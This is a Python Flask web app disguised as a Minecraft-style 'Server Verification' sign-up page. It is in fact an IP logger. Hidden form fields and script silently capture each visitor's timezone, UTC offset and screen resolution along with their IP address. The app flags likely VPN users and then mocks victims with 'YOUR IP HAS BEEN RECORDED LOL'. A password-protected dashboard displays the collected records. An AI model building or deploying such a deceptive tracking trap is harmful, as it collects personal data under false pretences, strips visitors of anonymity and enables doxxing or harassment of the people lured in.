from flask import Flask, request, render_template_string, session, redirect, url_for
import datetime
import os

app = Flask(__name__)
app.secret_key = "final-intel-vault"

ADMIN_PASSWORD = "your-password" # CHANGE THIS
recorded_ips = []

# --- HTML TEMPLATES ---

VERIFY_HTML = """
<!DOCTYPE html>
<html>
<head><title>Server Verification</title><style>
    body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .box { background: #333; padding: 30px; border-radius: 8px; text-align: center; }
    input { padding: 10px; width: 220px; border: none; border-radius: 4px; margin-bottom: 10px; }
    button { padding: 10px 20px; background: #52a054; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
</style></head>
<body>
    <div class="box">
        <h2>Sign up</h2>
        <p style="color: #bbb;">Verify your identity to join.</p>
        <form method="POST">
            <input type="text" name="mc_name" placeholder="Minecraft Username, Nickname, etc" required autofocus>
            <input type="hidden" name="tz" id="tz">
            <input type="hidden" name="offset" id="os">
            <input type="hidden" name="sc" id="sc">
            <br><button type="submit">Verify & Connect</button>
        </form>
    </div>
    <script>
        document.getElementById('tz').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
        document.getElementById('os').value = new Date().getTimezoneOffset();
        document.getElementById('sc').value = window.screen.width + "x" + window.screen.height;
    </script>
</body>
</html>
"""

CAUGHT_HTML = """
<!DOCTYPE html>
<html><head><style>
    body { background: #000; color: #ff0000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial Black'; text-align: center; }
    h1 { font-size: 6vw; animation: blinker 0.6s linear infinite; }
    @keyframes blinker { 50% { opacity: 0; } }
</style></head>
<body><h1>YOUR IP HAS BEEN RECORDED LOL</h1></body></html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><title>Intel Dashboard</title><style>
    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
    table { width: 100%; border-collapse: collapse; background: white; font-size: 12px; }
    th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
    th { background: #333; color: white; }
    .vpn-warning { background: #ffeb3b; color: #d32f2f; font-weight: bold; padding: 2px 5px; border-radius: 3px; }
</style></head>
<body>
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h1>Security Intel Logs</h1>
        <!-- THE CLEAR BUTTON IS BACK -->
        <form action="/clear" method="POST">
            <button type="submit" onclick="return confirm('Wipe everything?')" style="background:red; color:white; border:none; padding:10px; cursor:pointer; border-radius:5px;">CLEAR ALL LOGS</button>
        </form>
    </div>
    <table>
        <tr>
            <th>User</th>
            <th>IP Address</th>
            <th>VPN Suspicion</th>
            <th>Browser Timezone</th>
            <th>Screen</th>
            <th>Logged At</th>
        </tr>
        {% for e in logs %}
        <tr>
            <td><strong>{{ e.name }}</strong></td>
            <td><code>{{ e.ip }}</code></td>
            <td>
                {% if e.vpn_flag %}
                <span class="vpn-warning">⚠️ HIGH SUSPICION</span>
                {% else %}
                <span style="color:green;">LOW</span>
                {% endif %}
            </td>
            <td>{{ e.tz }} <br><small>(Offset: {{ e.offset }})</small></td>
            <td>{{ e.screen }}</td>
            <td>{{ e.time }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# --- ROUTES ---

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        name = request.form.get('mc_name')
        tz = request.form.get('tz')
        offset = request.form.get('offset', '0')
        screen = request.form.get('sc')
        
        ip_raw = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip = ip_raw.split(',')[0].strip() if ip_raw else "Unknown"
        
        # VPN Flagging: Flag if offset isn't your local one (e.g., 240/300 for EST)
        vpn_flag = False
        try:
            if int(offset) not in [240, 300]: # Adjust these for your time zone!
                vpn_flag = True
        except: pass

        recorded_ips.append({
            "name": name, "ip": ip, "tz": tz, "offset": offset,
            "screen": screen, "vpn_flag": vpn_flag,
            "time": datetime.datetime.now().strftime("%I:%M:%S %p")
        })
        return render_template_string(CAUGHT_HTML)
    return render_template_string(VERIFY_HTML)

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
    
    if not session.get('logged_in'):
        return '<body style="text-align:center;padding:50px;font-family:sans-serif;">' \
               '<form method="POST">Password: <input type="password" name="password" autofocus>' \
               '<input type="submit" value="Login"></form></body>'
               
    return render_template_string(DASHBOARD_HTML, logs=recorded_ips[::-1])

@app.route('/clear', methods=['POST'])
def clear_logs():
    if session.get('logged_in'):
        recorded_ips.clear()
    return redirect(url_for('dashboard'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
